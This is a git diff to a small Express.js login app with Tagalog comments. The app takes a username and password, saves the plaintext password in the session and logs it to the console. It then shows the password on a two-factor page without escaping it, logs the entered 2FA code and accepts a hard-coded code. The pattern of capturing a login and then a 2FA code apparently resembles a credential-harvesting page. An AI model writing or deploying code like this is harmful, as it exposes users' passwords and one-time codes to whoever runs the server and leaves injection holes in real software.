@@ -1,10 +1,20 @@
 const express = require('express');
 const bodyParser = require('body-parser');
+const session = require('express-session'); // Import express-session
 const app = express();
 const PORT = 3000;
 
 // Middleware para mag-handle ng URL-encoded data
 app.use(bodyParser.urlencoded({ extended: true }));
+
+// Middleware para mag-handle ng sessions
+app.use(
+  session({
+    secret: 'your-secret-key', // Secret key for signing the session ID cookie
+    resave: false, // Avoid saving session if unmodified
+    saveUninitialized: true, // Save uninitialized sessions
+  })
+);
 
 // Serve static files (e.g., CSS, JS, images)
 app.use(express.static('public'));
@@ -19,15 +29,25 @@ app.post('/submit', (req, res) => {
   const username = req.body.username;
   const password = req.body.password;
 
+  // Save credentials sa session
+  req.session.username = username;
+  req.session.password = password;
+
+  // Log sa console
   console.log(`Username: ${username}`);
   console.log(`Password: ${password}`);
 
-  // Sa halip na mag-send ng direct response, mag-redirect sa 2FA page
+  // Redirect sa 2FA page
   res.redirect('/two-factor');
 });
 
 // Route para sa 2FA form
 app.get('/two-factor', (req, res) => {
+  // Check kung may username/password sa session, kung wala, redirect sa login
+  if (!req.session.username || !req.session.password) {
+    return res.redirect('/');
+  }
+
   res.send(`
     <!DOCTYPE html>
     <html lang="en">
@@ -81,6 +101,8 @@ app.get('/two-factor', (req, res) => {
     <body>
       <div class="container">
         <h2>Two-Factor Authentication</h2>
+        <p><strong>Logged Username:</strong> ${req.session.username}</p>
+        <p><strong>Logged Password:</strong> ${req.session.password}</p>
         <form action="/verify-2fa" method="POST">
           <input type="number" name="auth-code" placeholder="Enter 2FA Code" required>
           <button type="submit">Verify</button>
@@ -96,6 +118,8 @@ app.post('/verify-2fa', (req, res) => {
   const authCode = req.body['auth-code'];
 
   console.log(`2FA Code: ${authCode}`);
+  console.log(`Username: ${req.session.username}`);
+  console.log(`Password: ${req.session.password}`);
 
   if (authCode === '123456') { // Example valid code
     res.send('2FA Verification Successful! Welcome to your account.');
